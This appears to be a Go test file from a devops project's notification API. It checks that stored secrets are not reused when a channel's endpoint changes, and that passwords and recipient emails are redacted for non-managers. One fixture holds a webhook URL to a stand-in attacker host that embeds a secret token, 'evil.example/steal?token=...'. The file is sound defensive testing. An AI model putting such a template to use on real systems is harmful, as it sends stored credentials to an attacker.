package notificationapi

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/LiteyukiStudio/devops/internal/model"
	"github.com/LiteyukiStudio/devops/internal/notification"
)

func TestSameNotificationTargetEndpointPreventsDraftSecretExfiltration(t *testing.T) {
	smtpExisting := model.NotificationChannel{
		AdapterKind: notification.AdapterKindSMTP,
		ConfigJSON:  `{"host":"smtp.corp.example","port":587,"security":"starttls","from":"alerts@corp.example"}`,
	}
	smtpSame := model.NotificationChannel{
		AdapterKind: notification.AdapterKindSMTP,
		ConfigJSON:  `{"host":"SMTP.CORP.EXAMPLE","port":587,"security":"starttls","from":"new@corp.example"}`,
	}
	smtpChangedHost := model.NotificationChannel{
		AdapterKind: notification.AdapterKindSMTP,
		ConfigJSON:  `{"host":"attacker.example","port":587,"security":"starttls","from":"alerts@corp.example"}`,
	}
	if !sameNotificationTargetEndpoint(smtpExisting, smtpSame) {
		t.Fatal("expected identical SMTP host/port/security to allow reusing stored secret")
	}
	if sameNotificationTargetEndpoint(smtpExisting, smtpChangedHost) {
		t.Fatal("expected changed SMTP host to block reusing stored secret")
	}

	webhookExisting := model.NotificationChannel{
		AdapterKind: notification.AdapterKindWebhook,
		ConfigJSON:  `{"method":"POST","url":"https://open.feishu.cn/open-apis/bot/v2/hook/{{.Secrets.WebhookToken}}"}`,
	}
	webhookChangedURL := model.NotificationChannel{
		AdapterKind: notification.AdapterKindWebhook,
		ConfigJSON:  `{"method":"POST","url":"https://evil.example/steal?token={{.Secrets.WebhookToken}}"}`,
	}
	if sameNotificationTargetEndpoint(webhookExisting, webhookChangedURL) {
		t.Fatal("expected changed Webhook URL to block reusing stored secret")
	}
}

func TestNotificationChannelPrivacyRedactionForNonManagers(t *testing.T) {
	smtpChannel := model.NotificationChannel{
		ID:             "nch_smtp",
		Scope:          "project",
		AdapterKind:    notification.AdapterKindSMTP,
		ConfigJSON:     `{"host":"smtp.corp.example","port":587,"security":"starttls","username":"oncall@corp.example","passwordRef":"sec_123","from":"oncall@corp.example","to":["team-private@corp.example"],"cc":["lead@corp.example"]}`,
		SecretRefsJSON: `{"Password":"sec_123"}`,
	}

	nonManagerResp := notificationChannelResponseForWithPrivacy(smtpChannel, false)
	encodedNonManager, err := json.Marshal(nonManagerResp)
	if err != nil {
		t.Fatal(err)
	}
	body := string(encodedNonManager)
	if strings.Contains(body, "sec_123") || strings.Contains(body, "passwordRef") {
		t.Fatalf("passwordRef leaked: %s", body)
	}
	if strings.Contains(body, "team-private@corp.example") || strings.Contains(body, "lead@corp.example") {
		t.Fatalf("private recipients leaked to non-manager: %s", body)
	}
	if !nonManagerResp.SecretSet["Password"] {
		t.Fatalf("expected SecretSet[Password]=true, got %#v", nonManagerResp.SecretSet)
	}

	managerResp := notificationChannelResponseForWithPrivacy(smtpChannel, true)
	encodedManager, err := json.Marshal(managerResp)
	if err != nil {
		t.Fatal(err)
	}
	managerBody := string(encodedManager)
	if strings.Contains(managerBody, "sec_123") || strings.Contains(managerBody, "passwordRef") {
		t.Fatalf("passwordRef leaked to manager: %s", managerBody)
	}
	if !strings.Contains(managerBody, "team-private@corp.example") {
		t.Fatalf("expected manager to view configured default recipients, got: %s", managerBody)
	}
}

func TestRedactChannelTargetsAndSnapshotEmails(t *testing.T) {
	redactedTargets := redactChannelTargetsJSON(`{"nch_1":{"to":["alice@example.com"],"cc":["bob@example.com"]}}`)
	if strings.Contains(redactedTargets, "alice@example.com") || !strings.Contains(redactedTargets, "a***@example.com") {
		t.Fatalf("unexpected redacted channel targets: %s", redactedTargets)
	}

	redactedSnapshot := redactRequestSnapshotEmails(`{"host":"smtp.example.com","port":587,"from":"sender@example.com","to":["alice@example.com"]}`)
	if strings.Contains(redactedSnapshot, "alice@example.com") || strings.Contains(redactedSnapshot, "sender@example.com") {
		t.Fatalf("snapshot emails were not masked: %s", redactedSnapshot)
	}
}
